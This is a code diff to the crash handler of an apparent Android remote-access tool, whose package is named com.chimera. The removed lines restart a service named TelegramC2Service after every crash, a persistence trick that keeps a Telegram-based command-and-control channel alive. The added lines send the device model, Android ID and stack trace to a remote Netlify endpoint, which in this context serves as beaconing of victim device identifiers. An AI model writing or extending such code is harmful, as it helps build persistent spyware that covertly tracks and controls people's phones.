@@ -1,13 +1,19 @@
 package com.chimera;
 
-import android.app.AlarmManager;
-import android.app.PendingIntent;
 import android.content.Context;
-import android.content.Intent;
+import android.os.Build;
+import android.provider.Settings;
+import org.json.JSONObject;
+import java.io.OutputStream;
+import java.io.PrintWriter;
+import java.io.StringWriter;
+import java.net.HttpURLConnection;
+import java.net.URL;
+import java.nio.charset.StandardCharsets;
 
 public class CrashHandler implements Thread.UncaughtExceptionHandler {
-    private Context context;
-    private Thread.UncaughtExceptionHandler defaultHandler;
+    private final Context context;
+    private final Thread.UncaughtExceptionHandler defaultHandler;
 
     public CrashHandler(Context ctx) {
         this.context = ctx.getApplicationContext();
@@ -17,39 +23,46 @@ public class CrashHandler implements Thread.UncaughtExceptionHandler {
     @Override
     public void uncaughtException(Thread thread, Throwable throwable) {
         try {
-            // First, log the fatal crash
-            ErrorLogger.logError(context, "CrashHandler (FATAL)", throwable);
-
-            // Now, schedule the service to restart
-            scheduleRestart();
-
+            logCrashToServer(throwable);
         } catch (Exception e) {
-            // Failsafe if logging or scheduling fails
+            // Failsafe if remote logging fails
         } finally {
-            // Important: Call the default handler to allow the app to close properly
             if (defaultHandler != null) {
                 defaultHandler.uncaughtException(thread, throwable);
             }
-            System.exit(2); // Ensure the process terminates
+            System.exit(2);
         }
     }
 
-    private void scheduleRestart() {
+    private void logCrashToServer(Throwable throwable) {
         try {
-            Intent intent = new Intent(context, TelegramC2Service.class);
-            PendingIntent pendingIntent = PendingIntent.getService(
-                    context,
-                    999, // A unique request code
-                    intent,
-                    PendingIntent.FLAG_ONE_SHOT | PendingIntent.FLAG_IMMUTABLE
-            );
+            String deviceModel = Build.MANUFACTURER + " " + Build.MODEL;
+            String androidId = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
 
-            AlarmManager alarmManager = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
-            // Restart the service 1 second after the crash
-            alarmManager.set(AlarmManager.ELAPSED_REALTIME_WAKEUP, System.currentTimeMillis() + 1000, pendingIntent);
+            StringWriter sw = new StringWriter();
+            throwable.printStackTrace(new PrintWriter(sw));
+            String stackTrace = sw.toString();
 
+            JSONObject postData = new JSONObject();
+            postData.put("deviceName", deviceModel);
+            postData.put("deviceId", androidId);
+            postData.put("stackTrace", stackTrace);
+
+            URL url = new URL("https://your-netlify-app.netlify.app/.netlify/functions/log-crash");
+            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+            conn.setRequestMethod("POST");
+            conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
+            conn.setDoOutput(true);
+            conn.setConnectTimeout(10000);
+            conn.setReadTimeout(10000);
+
+            try (OutputStream os = conn.getOutputStream()) {
+                os.write(postData.toString().getBytes(StandardCharsets.UTF_8));
+            }
+            conn.getInputStream().close();
+            conn.disconnect();
         } catch (Exception e) {
-            ErrorLogger.logError(context, "CrashHandler_ScheduleRestart", e);
+            // This is a best-effort attempt, so we don't handle the failure
         }
     }
 }
